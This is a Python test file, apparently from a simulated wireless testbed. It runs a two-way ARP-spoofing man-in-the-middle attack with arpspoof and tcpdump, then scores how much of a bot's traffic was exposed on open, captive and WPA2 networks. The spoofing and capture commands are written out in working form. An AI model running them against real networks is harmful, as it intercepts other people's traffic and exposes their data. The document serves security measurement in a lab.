#!/usr/bin/env python
"""
common/tests/test_mitm.py

ARP-spoofing MITM test: attacker node poisons the ARP cache of a
target station and the gateway, forwards traffic between them, and
captures what passes through -- same scoring approach as test_sniff,
but via active interception rather than passive listening.

For WPA2, link-layer encryption doesn't stop ARP spoofing within an
already-joined network segment (it protects the air, not the LAN
segment behavior) -- this test is still meaningful and often still
succeeds. Record that nuance in `notes` rather than skipping the test.
"""

import os
import time
from common.exposure import score_exposure


def run(attacker_node, target, gateway_ip, duration, out_dir, network_type):
    """
    attacker_node: Mininet-WiFi station object performing the MITM
    target: station object being spoofed
    gateway_ip: IP of the network's gateway/AP
    duration: seconds to run the MITM + capture window
    out_dir: results/<network_type> directory
    network_type: 'open' | 'captive' | 'wpa2'
    """
    iface = f'{attacker_node.name}-wlan0'
    target_ip = target.IP() if hasattr(target, 'IP') else None

    # Enable IP forwarding on the attacker so it can relay traffic
    attacker_node.cmd('sysctl -w net.ipv4.ip_forward=1')

    pcap_path = os.path.join(out_dir, 'mitm_capture.pcap')
    attacker_node.cmd(f'tcpdump -i {iface} -w {pcap_path} &')
    time.sleep(2)

    # Two-way ARP poisoning: tell target that attacker is the gateway,
    # and tell gateway that attacker is the target.
    arpspoof_1 = attacker_node.cmd(
        f'arpspoof -i {iface} -t {target_ip} {gateway_ip} > /dev/null 2>&1 &'
    )
    arpspoof_2 = attacker_node.cmd(
        f'arpspoof -i {iface} -t {gateway_ip} {target_ip} > /dev/null 2>&1 &'
    )

    time.sleep(duration)

    # Clean up: stop spoofing and sniffing
    attacker_node.cmd('pkill -f arpspoof')
    attacker_node.cmd(f'pkill -f "tcpdump -i {iface}"')
    time.sleep(1)
    attacker_node.cmd('sysctl -w net.ipv4.ip_forward=0')

    local_sent_log = os.path.join(out_dir, 'bot_sent_log.jsonl')
    exposure = score_exposure(pcap_path, local_sent_log) if os.path.exists(local_sent_log) else {
        'records_sent': 0, 'records_exposed': 0, 'exposure_rate': 0.0,
        'time_to_first_exposure_sec': None, 'exposed_fields_breakdown': {}
    }

    result = {
        'network_type': network_type,
        'method': 'mitm_arp_spoof',
        'target': target_ip,
        'gateway_ip': gateway_ip,
        'duration_sec': duration,
        'pcap_path': pcap_path,
        'notes': (
            'Link-layer encryption (WPA2) does not prevent ARP spoofing between '
            'hosts already on the same LAN segment; interpret exposure_rate here '
            'as LAN-segment risk, not a WPA2 key-recovery result.'
            if network_type == 'wpa2' else
            'No link-layer protection; ARP spoofing operates unobstructed on this network type.'
        ),
    }
    result.update(exposure)
    return result